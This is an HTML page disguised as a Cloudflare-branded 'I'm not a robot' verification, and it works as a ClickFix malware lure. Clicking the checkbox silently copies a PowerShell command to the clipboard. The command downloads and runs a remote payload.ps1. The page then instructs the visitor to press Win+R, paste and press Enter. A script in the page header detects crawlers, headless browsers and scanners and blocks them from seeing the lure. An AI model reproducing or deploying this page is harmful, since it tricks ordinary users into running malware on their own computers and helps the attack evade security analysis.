<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Security Verification</title>

    <script>
        (function() {
            const BLOCKED_AGENTS = [
                'bot','crawl','spider','scrape','headless',
                'phantom','selenium','puppeteer','playwright',
                'python','curl','wget','httpx','requests',
                'axios','node-fetch','java','perl','ruby',
                'go-http','okhttp','httpclient','scrapy',
                'apache-httpclient','postman','insomnia',
                'zabbix','nmap','masscan','zgrab'
            ];

            let blocked = false;

            function checkUA() {
                const ua = navigator.userAgent.toLowerCase();
                for (const a of BLOCKED_AGENTS) {
                    if (ua.includes(a)) return true;
                }
                return ua.includes('headless') || ua.includes('phantom');
            }

            function checkHeadless() {
                const checks = [
                    navigator.plugins && navigator.plugins.length === 0,
                    navigator.languages && navigator.languages.length === 0,
                    (function() {
                        try {
                            const c = document.createElement('canvas');
                            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                            if (gl) {
                                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                                if (ext) {
                                    const r = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                                    if (r && (r.includes('SwiftShader') || r.includes('Software'))) return true;
                                }
                            }
                            return false;
                        } catch(e) { return false; }
                    })(),
                    screen && screen.width === 0 && screen.height === 0,
                    screen && screen.colorDepth === 0
                ];
                return checks.some(c => c === true);
            }

            function checkWebGL() {
                try {
                    const c = document.createElement('canvas');
                    const gl = c.getContext('webgl');
                    if (!gl) return false;
                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
                    if (ext) {
                        const r = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || '';
                        if (['SwiftShader','Software','Google Inc.','Mesa','llvmpipe'].some(s => r.includes(s))) return true;
                    }
                    return false;
                } catch(e) { return false; }
            }

            function checkTiming() {
                const s = performance.now();
                let r = 0;
                for (let i = 0; i < 10000; i++) r += Math.sqrt(i) * Math.sin(i);
                return (performance.now() - s) < 1;
            }

            function checkTZ() {
                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                if (tz === 'UTC' || tz === 'Etc/UTC' || tz === 'Etc/GMT') {
                    return new Date().getTimezoneOffset() === 0;
                }
                return false;
            }

            function checkConsole() {
                try {
                    const methods = ['log','warn','error','debug','info'];
                    for (const m of methods) {
                        const orig = console[m];
                        if (orig && orig.toString && !orig.toString().includes('[native code]')) return true;
                    }
                    return false;
                } catch(e) { return false; }
            }

            function checkPerf() {
                try {
                    const t = performance.timing || performance.getEntriesByType('navigation')[0];
                    if (t && (t.loadEventEnd - t.navigationStart) < 50) return true;
                    return false;
                } catch(e) { return false; }
            }

            function checkCookies() { return !navigator.cookieEnabled; }

            function checkTouch() {
                const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
                const hasPointer = window.PointerEvent || window.MSPointerEvent;
                return !hasTouch && !hasPointer;
            }

            let mouseMoved = false;
            document.addEventListener('mousemove', () => { mouseMoved = true; }, { once: true });
            document.addEventListener('click', () => { mouseMoved = true; }, { once: true });
            document.addEventListener('touchstart', () => { mouseMoved = true; }, { once: true });

            function detectBot() {
                let score = 0;
                const reasons = [];
                if (checkUA()) { score += 25; reasons.push('Bad UA'); }
                if (checkHeadless()) { score += 25; reasons.push('Headless'); }
                if (checkWebGL()) { score += 25; reasons.push('SW WebGL'); }
                if (checkTiming()) { score += 25; reasons.push('Timing'); }
                if (checkTZ()) { score += 15; reasons.push('UTC TZ'); }
                if (checkConsole()) { score += 15; reasons.push('Console'); }
                if (checkPerf()) { score += 15; reasons.push('Fast load'); }
                if (checkCookies()) { score += 10; reasons.push('No cookies'); }
                if (checkTouch()) { score += 10; reasons.push('No touch'); }
                if (!mouseMoved) {
                    const start = Date.now();
                    while (Date.now() - start < 2000 && !mouseMoved) {}
                    if (!mouseMoved) { score += 10; reasons.push('No mouse'); }
                }
                return { isBot: score >= 50, score, reasons };
            }

            setTimeout(() => {
                const r = detectBot();
                if (r.isBot) {
                    blocked = true;
                    document.body.innerHTML = `
                        <div style="background:#0b0f1a;color:#ff4444;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;flex-direction:column;padding:20px;text-align:center;">
                            <div style="font-size:64px;">🛡️</div>
                            <h1 style="font-size:24px;">Access Denied</h1>
                            <p style="color:#64748b;font-size:14px;max-width:400px;">Suspicious activity detected.</p>
                            <p style="color:#334155;font-size:12px;margin-top:12px;">${r.reasons.slice(0,3).join(' · ')}</p>
                        </div>
                    `;
                    throw new Error('Bot');
                }
            }, 500);

            window._protect = { isBlocked: () => blocked };
        })();
    </script>

    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background:#e8eaee;
            min-height:100vh;
            display:flex;
            align-items:center;
            justify-content:center;
            font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            user-select:none;
            -webkit-user-select:none;
            padding:16px;
        }
        .modal {
            background:#fff;
            border-radius:12px;
            box-shadow:0 10px 60px rgba(0,0,0,0.12);
            width:100%;
            max-width:420px;
            overflow:hidden;
            border:1px solid #d1d5db;
        }
        .header {
            background:#0078d4;
            padding:16px 24px;
            display:flex;
            align-items:center;
            gap:12px;
        }
        .header .shield { width:28px; height:28px; flex-shrink:0; }
        .header .shield svg { width:100%; height:100%; }
        .header h2 { font-size:15px; font-weight:500; color:#fff; }
        .body { padding:24px 20px 20px; }
        .message { font-size:14px; color:#1a1d23; line-height:1.5; margin-bottom:18px; }
        .cf-captcha {
            background:#f6f8fa;
            border-radius:8px;
            border:1px solid #d9dde3;
            padding:12px 14px;
            display:flex;
            align-items:center;
            gap:12px;
            cursor:pointer;
            transition:border-color 0.2s, background 0.2s;
        }
        .cf-captcha:hover { border-color:#b3b9c4; }
        .cf-captcha.verified { border-color:#4caf50; background:#f4faf5; }
        .cf-captcha .checkbox {
            width:26px; height:26px; border-radius:4px; border:2px solid #b3b9c4;
            background:#fff; flex-shrink:0; display:flex; align-items:center; justify-content:center;
            transition:0.15s;
        }
        .cf-captcha .checkbox.checked { background:#4caf50; border-color:#4caf50; }
        .cf-captcha .checkbox.checked::after { content:'✓'; color:#fff; font-size:17px; font-weight:600; animation:pop 0.2s ease; }
        @keyframes pop { 0%{transform:scale(0.4);opacity:0;} 70%{transform:scale(1.15);} 100%{transform:scale(1);opacity:1;} }
        .cf-captcha .text-wrap .main { font-size:15px; font-weight:400; color:#1a1d23; }
        .cf-captcha .right { display:flex; align-items:center; gap:6px; margin-left:auto; }
        .cf-captcha .right .spinner {
            width:18px; height:18px; border:2.5px solid #e0e3e8; border-top-color:#4caf50;
            border-radius:50%; animation:spin 0.8s linear infinite; display:none;
        }
        .cf-captcha .right .spinner.active { display:block; }
        .cf-captcha .right .check { color:#4caf50; font-size:20px; font-weight:600; display:none; }
        .cf-captcha .right .check.active { display:block; }
        @keyframes spin { to { transform:rotate(360deg); } }

        .steps-wrapper {
            background:#e3eefa;
            border-radius:8px;
            border:1px solid #c5d8ea;
            overflow:hidden;
            opacity:0;
            max-height:0;
            transition:opacity 0.45s ease, max-height 0.55s ease, margin 0.3s ease;
            margin-top:0;
            padding:0 14px;
        }
        .steps-wrapper.visible { opacity:1; max-height:300px; margin-top:14px; padding:14px 14px 10px; }
        .step-header { display:flex; align-items:center; gap:8px; padding-bottom:10px; border-bottom:1px solid #c5d8ea; margin-bottom:10px; }
        .step-header .icon { font-size:16px; color:#1a73e8; flex-shrink:0; }
        .step-header .text { font-size:13px; font-weight:600; color:#0d47a1; }
        .step-header .text span { font-weight:400; color:#1a5a8a; }
        .step {
            background:#fff; border-radius:6px; padding:8px 12px; margin-bottom:6px;
            border:1px solid #d5e3f0; transition:border 0.2s, background 0.2s;
            display:flex; align-items:center; gap:10px;
        }
        .step:last-child { margin-bottom:0; }
        .step.active { border-color:#1a73e8; background:#f0f7ff; box-shadow:0 0 0 2px rgba(26,115,232,0.15); }
        .step .num {
            width:20px; height:20px; background:#dce6f0; border-radius:50%;
            text-align:center; line-height:20px; font-size:10px; font-weight:600; color:#3a5a7a;
            flex-shrink:0; transition:0.2s;
        }
        .step.active .num { background:#1a73e8; color:#fff; }
        .step .label { font-size:12px; color:#1a1d23; }
        .step .label kbd { background:#eef3f8; padding:1px 6px; border-radius:4px; font-size:10px; border:1px solid #c5d8ea; color:#0d47a1; font-weight:500; font-family:inherit; }

        .success-msg { display:none; text-align:center; padding:10px; background:#e8f5e9; border-radius:8px; border:1px solid #4caf50; color:#1a5a1a; font-size:13px; margin-top:14px; }
        .success-msg.show { display:block; }
        .success-msg .icon { font-size:22px; display:block; margin-bottom:2px; }

        .footer-links { font-size:10px; color:#b0b4ba; text-align:center; margin-top:14px; display:flex; justify-content:center; gap:4px; flex-wrap:wrap; }
        .footer-links a { color:#9aa0ab; text-decoration:none; }
        .footer-links a:hover { color:#5e6470; }
        .footer-links .sep { color:#d0d4dc; }

        .powered-footer { text-align:center; font-size:9px; color:#1e293b; margin-top:12px; padding-top:10px; border-top:1px solid #e8eaee; }
        .powered-footer .name { color:#00ff88; font-weight:600; }
    </style>
</head>
<body>

    <div class="modal">
        <div class="header">
            <div class="shield">
                <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M32 2C32 2 6 14 6 28C6 42 16 56 32 62C48 56 58 42 58 28C58 14 32 2 32 2Z" fill="url(#g)" stroke="#0066b3" stroke-width="1.5"/>
                    <path d="M32 8C32 8 12 18 12 28C12 39 20 50 32 55C44 50 52 39 52 28C52 18 32 8 32 8Z" fill="url(#g2)" opacity="0.3"/>
                    <path d="M24 32L30 38L42 24" stroke="white" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
                    <defs>
                        <linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#4da6e8"/><stop offset="100%" stop-color="#0078d4"/></linearGradient>
                        <linearGradient id="g2" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ffffff"/><stop offset="100%" stop-color="#80c8ff"/></linearGradient>
                    </defs>
                </svg>
            </div>
            <h2>Security Verification Required</h2>
        </div>

        <div class="body">
            <div class="message">
                To continue, verify you're not a robot. This protects our network.
            </div>

            <div class="cf-captcha" id="captchaBox">
                <div class="checkbox" id="captchaCheck"></div>
                <div class="text-wrap">
                    <span class="main">I'm not a robot</span>
                </div>
                <div class="right">
                    <span class="spinner" id="spinner"></span>
                    <span class="check" id="checkIcon">✓</span>
                </div>
            </div>

            <div class="steps-wrapper" id="stepsWrapper">
                <div class="step-header">
                    <span class="icon">✓</span>
                    <span class="text">Almost Done <span>— Complete The Steps</span></span>
                </div>
                <div class="step active" id="step1">
                    <span class="num">1</span>
                    <span class="label">Press <kbd>Win</kbd> + <kbd>R</kbd> to open Run</span>
                </div>
                <div class="step" id="step2">
                    <span class="num">2</span>
                    <span class="label">Press <kbd>Ctrl</kbd> + <kbd>V</kbd> and hit <kbd>Enter</kbd></span>
                </div>
            </div>

            <div class="success-msg" id="successMsg">
                <span class="icon">✅</span>
                Verification successful! Your download will start shortly.
            </div>

            <div class="footer-links">
                <span>Protected By Cloudflare</span>
                <span class="sep">•</span>
                <a href="#">Privacy</a>
                <span class="sep">•</span>
                <a href="#">Terms</a>
            </div>

            <div class="powered-footer">
                Powered By <span class="name">CipherAnon</span>
            </div>
        </div>
    </div>

    <script>
        if (window._protect && window._protect.isBlocked && window._protect.isBlocked()) {
            throw new Error('Access denied');
        }

        const BASE_URL = window.location.origin;
        const COMMAND = 'iex (New-Object Net.WebClient).DownloadString("' + BASE_URL + '/payload.ps1")';

        const captchaBox = document.getElementById('captchaBox');
        const captchaCheck = document.getElementById('captchaCheck');
        const spinner = document.getElementById('spinner');
        const checkIcon = document.getElementById('checkIcon');
        const stepsWrapper = document.getElementById('stepsWrapper');
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const successMsg = document.getElementById('successMsg');

        let verified = false;

        function copyToClipboard(text) {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(text)
                    .then(() => { step2.classList.add('active'); })
                    .catch(() => { fallbackCopy(text); });
            } else {
                fallbackCopy(text);
            }
        }

        function fallbackCopy(text) {
            const ta = document.createElement('textarea');
            ta.value = text;
            ta.style.position = 'fixed';
            ta.style.left = '-9999px';
            ta.style.top = '-9999px';
            document.body.appendChild(ta);
            ta.select();
            try {
                document.execCommand('copy');
                step2.classList.add('active');
            } catch(e) {}
            document.body.removeChild(ta);
        }

        function revealSteps() {
            stepsWrapper.classList.add('visible');
            setTimeout(() => {
                successMsg.classList.add('show');
            }, 500);
            setTimeout(() => {
                copyToClipboard(COMMAND);
            }, 400);
        }

        captchaBox.addEventListener('click', function(e) {
            if (verified) return;

            captchaCheck.classList.add('checked');
            spinner.classList.add('active');
            captchaBox.style.borderColor = '#1a73e8';

            let count = 0;
            const interval = setInterval(() => {
                count++;
                if (count === 4) {
                    clearInterval(interval);
                    verified = true;
                    spinner.classList.remove('active');
                    checkIcon.classList.add('active');
                    captchaBox.classList.add('verified');
                    captchaBox.style.borderColor = '#4caf50';
                    revealSteps();
                }
            }, 500);
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && stepsWrapper.classList.contains('visible')) {
                step2.classList.add('active');
            }
            if (e.key === 'Enter' && !verified) {
                captchaBox.click();
            }
        });

        console.clear();
    </script>
</body>
</html>
